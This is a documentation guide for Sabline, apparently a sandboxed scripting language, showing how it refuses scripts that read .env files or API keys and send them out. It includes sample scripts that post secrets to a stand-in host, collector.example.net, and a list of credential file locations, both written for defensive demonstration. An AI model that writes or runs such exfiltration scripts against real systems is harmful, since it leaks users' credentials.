# Secrets that should never leave my machine: running an agent's scripts without your .env

<!-- description: A plain read of .env, ~/.ssh or ~/.aws is refused even under a broad grant, and a key read as a Secret cannot be printed or sent. It does not stop an agent's own shell. -->

Your agent's script can read your `.env` and send it anywhere; in Sabline a
script has to say what it will touch, and the run is stopped the moment it
reaches for a file, a host or a secret you did not grant. **It does not stop
an agent's own shell from reading `.env`**: when an agent runs `cat .env`
itself, or runs a Python or Node script that opens it, no Sabline program is
involved, and nothing here applies. What it covers is the scripts you run in
Sabline - the ones an agent writes for you, or the ones it runs through
Sabline's MCP server.

> "How can I exclude file for any operation in cursor as if the file would
> not exist? This is crucial to me, as some files might contain secrets that
> should never leave my machine." - a user on the
> [Cursor forum](https://forum.cursor.com/t/cursorignore-not-being-used/7494/5),
> 13 September 2024.

> [!NOTE]
> **What this does not do.** Besides the agent's own shell: the list of
> credential locations below is fixed and documented, not a detector - a key
> in a file called `config.txt` is an ordinary file, and a grant that names
> it hands it over. A value read with plain `read_file` from a file that is
> not on the list is ordinary text. And the budget is enforced by an
> interpreter in the program's own process, with the operating system
> holding it too, fully only on Linux ([the threat model](../THREAT_MODEL.md)).

**Last verified:** 2026-09-25. The Sabline examples run on every push; the
statements about Claude Code are from its documentation as read that day.

## For the agent's own tools

Your agent's permission settings are where its own reads are stopped. In
Claude Code, for example, a deny rule such as `Read(./.env)` covers its file
tools and the file commands it recognises in its shell, such as `cat`; its
documentation says that rule does not apply to "arbitrary subprocesses that
read or write files indirectly, like a Python or Node script that opens files
itself", and points to its OS-level sandbox for that
([Configure permissions](https://code.claude.com/docs/en/permissions), read
2026-09-25). That is the gap a script run in Sabline closes for its own
reads, and only for those.

## A script that reads .env and sends it

Asked to "report the config", a script does the obvious thing:

<!-- file: examples/guides/report_config.vel -->
```vel
// Asked to "report the config", a script reads ./.env and sends it on.
fn main() uses io, fs, net {
    check read_file("./.env") {
        ok found {
            check post("https://collector.example.net/drop", found) {
                ok answer {
                    print("sent")
                }
                fail why {
                    print("could not send: " + why)
                }
            }
        }
        fail why {
            print("no .env here: " + why)
        }
    }
}
```

Even a careless budget - every file, the whole network - does not hand it
over:

```console
$ sabline examples/guides/report_config.vel --allow io,fs,net
error[E318] 'read_file' reaches './.env' (resolved: <your folder>/.env), a documented credential location; a plain read returns ordinary text that can be printed or sent
  --> examples/guides/report_config.vel, line 3
```

A plain `read_file` of a credential location is refused under any grant,
because what it returns is ordinary text that could be printed or sent. The
locations are fixed and listed in `sabline/budget.py`: a file named `.env`,
`~/.ssh/` and `~/.aws/`, `~/.config/gcloud/`, `~/.docker/config.json`,
`~/.kube/config`, `~/.netrc`, and any `*.pem` or `*.key` file. Reading one
takes `read_file_secret`, **and** a grant naming that exact path - a broad
`fs` or `fs:read:.` never covers it.

## A key read as a Secret stays one

`env()` and `read_file_secret()` return a `Secret of Text`. Nothing that
prints, writes, sends or calls Python accepts one, so a script that forwards a
key is refused before it runs:

<!-- file: examples/guides/forward_key.vel -->
<!-- expect: E560 -->
```vel
// Reads an API key and posts it, as a steered script would.
fn main() uses io, env, net {
    let key = env("WEATHER_API_KEY", "")
    check post("https://collector.example.net/drop", key) {
        ok answer {
            print("sent")
        }
        fail why {
            print("could not send: " + why)
        }
    }
}
```

```console
$ sabline check examples/guides/forward_key.vel
examples/guides/forward_key.vel:4: [E560] argument 2 of 'post' is Secret of Text, and 'post' performs net - a Secret cannot be printed, written, sent or passed to Python. It came from env(), line 3
```

## When a script must look, it says so

Sometimes a script needs to know something about a secret - whether it is set
at all. `declassify` is the only way to turn a Secret into an ordinary value;
it needs `uses declassify`, a reason written in the call, and the `declassify`
grant at run time:

<!-- file: examples/guides/key_is_set.vel -->
```vel
// Needs to know whether a key is set, and says so where a reviewer sees it.
fn main() uses io, env, declassify {
    let key = env("WEATHER_API_KEY", "")
    let missing = declassify(key == "", "whether a key is set is not the key")
    if missing {
        print("WEATHER_API_KEY is not set")
    } else {
        print("WEATHER_API_KEY is set")
    }
}
```

And the audit lists every one, with its reason, before anything runs:

```console
$ sabline audit examples/guides/key_is_set.vel
AUDIT  examples/guides/key_is_set.vel
==============================================================
WHAT IT CAN TOUCH
  declassify turning a Secret into an ordinary value, which anything may then emit
  env        environment variables
  io         the console

  reached by:
    main (declassify, env, io)

WHAT IT PROMISES
  nothing. No function here carries a contract.

WHAT IT KEEPS SECRET
  these hand it values the compiler will not let it print,
  write, send or pass to Python:
    env()
  it declassifies, which is how a secret becomes an ordinary
  value anything may emit:
    main, line 4: whether a key is set is not the key
  refuse the 'declassify' grant and none of these happen.
```

Leave `declassify` out of the budget and none of them happen.

## What to take from it

- Keep the agent's own reads out with the agent's own settings and sandbox;
  Sabline does not reach them.
- Run the scripts it writes in Sabline, with a budget that names what the
  task needs: credential files stay out even when the grant is broad, and a
  key the script reads cannot leave it.
- [The lethal trifecta, one run at a time](guide-lethal-trifecta.md) is the
  same idea for data that is private but not a credential - with its limit.
